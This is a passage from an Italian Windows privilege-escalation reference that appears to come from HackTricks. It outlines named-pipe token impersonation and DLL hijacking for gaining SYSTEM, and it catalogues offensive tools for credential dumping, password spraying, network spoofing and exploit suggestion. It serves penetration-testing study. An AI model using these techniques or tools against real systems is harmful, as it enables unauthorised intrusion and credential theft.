**Puoi trovare un** [**esempio di codice che esegue la tecnica proposta qui**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

Questa tecnica è utilizzata da meterpreter per escalare in `getsystem`. La tecnica consiste nel **creare un pipe e poi creare/abuse un servizio per scrivere su quel pipe**. Poi, il **server** che ha creato il pipe utilizzando il privilegio **`SeImpersonate`** sarà in grado di **impersonare il token** del client del pipe (il servizio) ottenendo privilegi SYSTEM.\
Se vuoi [**saperne di più sui named pipes dovresti leggere questo**](./#named-pipe-client-impersonation).\
Se vuoi leggere un esempio di [**come passare da alta integrità a System utilizzando i named pipes dovresti leggere questo**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

Se riesci a **hijackare un dll** che viene **caricato** da un **processo** in esecuzione come **SYSTEM** sarai in grado di eseguire codice arbitrario con quei permessi. Pertanto, il Dll Hijacking è utile anche per questo tipo di escalation dei privilegi e, inoltre, è **molto più facile da ottenere da un processo ad alta integrità** poiché avrà **permessi di scrittura** sulle cartelle utilizzate per caricare i dll.\
**Puoi** [**saperne di più sul Dll hijacking qui**](dll-hijacking/)**.**

### **Da Administrator o Network Service a System**

{% embed url="https://github.com/sailay1996/RpcSsImpersonator" %}

### Da LOCAL SERVICE o NETWORK SERVICE a privilegi completi

**Leggi:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## Maggiori aiuti

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Strumenti utili

**Miglior strumento per cercare vettori di escalation dei privilegi locali di Windows:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Controlla per misconfigurazioni e file sensibili (**[**controlla qui**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Rilevato.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Controlla per alcune possibili misconfigurazioni e raccoglie informazioni (**[**controlla qui**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Controlla per misconfigurazioni**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- Estrae informazioni sulle sessioni salvate di PuTTY, WinSCP, SuperPuTTY, FileZilla e RDP. Usa -Thorough in locale.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Estrae credenziali dal Credential Manager. Rilevato.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Spruzza le password raccolte attraverso il dominio**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh è uno strumento di spoofing e man-in-the-middle PowerShell ADIDNS/LLMNR/mDNS/NBNS.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Enumerazione di base dei privesc di Windows**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **\~\~**\~\~ -- Cerca vulnerabilità di privesc note (DEPRECATO per Watson)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Controlli locali **(Richiede diritti di amministratore)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Cerca vulnerabilità di privesc note (deve essere compilato utilizzando VisualStudio) ([**precompilato**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Enumera l'host cercando misconfigurazioni (più uno strumento di raccolta informazioni che di privesc) (deve essere compilato) **(**[**precompilato**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Estrae credenziali da molti software (exe precompilato in github)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- Porting di PowerUp in C#**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **\~\~**\~\~ -- Controlla per misconfigurazioni (eseguibile precompilato in github). Non raccomandato. Non funziona bene in Win10.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Controlla per possibili misconfigurazioni (exe da python). Non raccomandato. Non funziona bene in Win10.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Strumento creato basato su questo post (non ha bisogno di accesschk per funzionare correttamente ma può usarlo).

**Locale**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- Legge l'output di **systeminfo** e raccomanda exploit funzionanti (python locale)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- Legge l'output di **systeminfo** e raccomanda exploit funzionanti (python locale)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

Devi compilare il progetto utilizzando la versione corretta di .NET ([vedi questo](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Per vedere la versione installata di .NET sull'host vittima puoi fare:
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## Bibliografia

- [http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)\\
- [http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)\\
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)\\
- [https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)\\
- [https://www.youtube.com/watch?v=\_8xJaaQlpBo](https://www.youtube.com/watch?v=_8xJaaQlpBo)\\
- [https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)\\
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)\\
- [https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)\\
- [https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)\\
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)\\
- [https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)\\
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)\\
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)\\
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)

{{#include ../../banners/hacktricks-training.md}}
